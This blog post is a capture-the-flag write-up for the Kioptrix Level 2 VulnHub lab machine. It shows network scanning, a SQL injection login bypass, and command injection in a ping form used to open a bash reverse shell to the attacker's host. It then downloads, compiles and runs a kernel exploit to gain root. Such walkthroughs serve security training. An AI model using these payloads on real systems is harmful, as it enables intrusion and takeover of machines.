---
layout: post
title: "Kioptrix Level 2"
date: 2022-02-09
categories: [VulnHub, Easy-VulnHub]
tags: [boot2root]
image: ../../assets/img/posts/Kioptrix2.png
---

## Description

This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges. 

|**Box**|[Kioptrix Level 2](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[Kioptrix](https://www.vulnhub.com/author/kioptrix,8/)|

---

We'll start with first discovering the IP address of the box using **netdiscover** tool,

```bash
sudo netdiscover -r 10.0.2.0/24
```

![image](https://user-images.githubusercontent.com/67465230/187391745-98d46f19-3f2a-42b3-b715-7c1657abad15.png)

Okay, so the IP address of the box is **10.0.2.67**.

Now, let's start port scanning with **nmap**,

```bash
sudo nmap -A -T4 -p- -oN nmap_scan 10.0.2.67
```

![image](https://user-images.githubusercontent.com/67465230/187391795-264951ca-cf89-4ede-80ef-ca4dc87c8990.png)
![image](https://user-images.githubusercontent.com/67465230/187391839-6e507aae-a8af-437e-86ff-9289bc996b8a.png)

there are multiple ports open. Let's enumerate each one of them.

Let's find out what technologies are running on the machine using **whatweb** tool,

```bash
whatweb http://10.0.2.67
```

![image](https://user-images.githubusercontent.com/67465230/187391883-0ef985e2-0cf0-4ea5-b130-d73ee24d3f41.png)

it's running PHP programming language, has a password field (maybe login mechanism).

visit http://10.0.2.67,

![image](https://user-images.githubusercontent.com/67465230/187391935-3e1135a5-9930-406d-bfe8-7bb009992a5f.png)

we got a admin login page. Let's try to break through in using SQLi.

We'll put username as `admin' or 1=1#` and password as `admin`(**any**)

![image](https://user-images.githubusercontent.com/67465230/187392002-af30cf8e-c062-44a7-8a56-1450353a251d.png)

we'll get logged in as administrator,

![image](https://user-images.githubusercontent.com/67465230/187392058-00dca0e1-2298-4ef8-a6d3-1004b651d7cd.png)

seems like this is a web console and we can ping any machines. Let's ping our own machine,

when **127.0.0.1** is entered in empty area, we'll get this result,

![image](https://user-images.githubusercontent.com/67465230/187392140-fc29569b-73c3-44ef-be03-68033b48aa0d.png)

we got ping result. This is a OS Command Execution Vulnerability and we can run other system commands as well on this web console.

Let's get to know which user we're by, `whoami`

![image](https://user-images.githubusercontent.com/67465230/187392175-94bf8ee4-fe93-481a-9b54-a6577d41ab76.png)

Let's start the netcat listener on kali terminal using `nc -nvlp 4444` and we'll put this one liner reverse shell in ping utility of website to get us a reverse shell when command gets executed.

```bash
127.0.0.1; bash -c 'exec bash -i &>/dev/tcp/10.0.2.15/4444 <&1'
```

![image](https://user-images.githubusercontent.com/67465230/187392265-9a294c55-d863-41b3-b84d-2dd46197047a.png)

as soon as this command runs, we'll get back a reverse connection,

![image](https://user-images.githubusercontent.com/67465230/187392307-3b03776f-1e1f-4d12-9dd8-1b64b722f47a.png)

we're apache user.

After enumeration, I found that there's nothing we can do to elevate our privileges to users like john or harold. **Privilege Escalation:** we'll escalate our privileges to super-user with help of enumeration. Let's first find out what is the system OS running,

```bash
cat /etc/*-release
```

![image](https://user-images.githubusercontent.com/67465230/187392359-8c4c7b0e-bf4a-46fc-ae6d-debe4da51475.png)

this box is running CentOS 4.5 Final.

Let's take a look at kernel version,

```bash
uname -mrs
``` 

![image](https://user-images.githubusercontent.com/67465230/187392424-94ab3240-c1d6-4cab-9b60-9f7378fe65ef.png)

The kernel version of this box is **Linux 2.6.9-55.EL**. After doing some research on google, I found that this kernel is named as **IP_Append_data()**. Let's search this exploit on searchsploit,

```bash
searchsploit ip append data
```

![image](https://user-images.githubusercontent.com/67465230/187392486-92c5aed9-b37d-4244-affd-d9ca203b2593.png)

this is a c file.

Let's download the exploit on our dir and start the python webserver using `python3 -m http.server 8000` and now we're going to upload this exploit on the box,

first navigate to /tmp directory because this directory has writable permissions and then we'll download this exploit using **wget** command,

```bash
wget http://10.0.2.15:8000/9542.c
```

let's check if our exploit is present on /tmp directory,

![image](https://user-images.githubusercontent.com/67465230/187392683-205949f6-0e0d-4bb1-ae7f-0f31b99db1c8.png)

yes, it has been downloaded successfully.

Let's now compile this exploit using **gcc** compiler,

```bash
gcc -o 9542 9542.c
```

![image](https://user-images.githubusercontent.com/67465230/187392723-41628453-a374-409e-907a-b543e7ffbb4e.png)

Let's view if our exploit is compiled or not,

![image](https://user-images.githubusercontent.com/67465230/187392781-868b883d-64a4-49b6-a65e-5ef0bee2ff85.png)

yes, it has been successfully compiled. Now, run the exploit,

```bash
./9542
```

![image](https://user-images.githubusercontent.com/67465230/187392826-30489e1f-3bda-44a5-8927-2b4e85c6940d.png)

doing `id` will show us that we're now ROOT user!!!.

We've successfully rooted this box.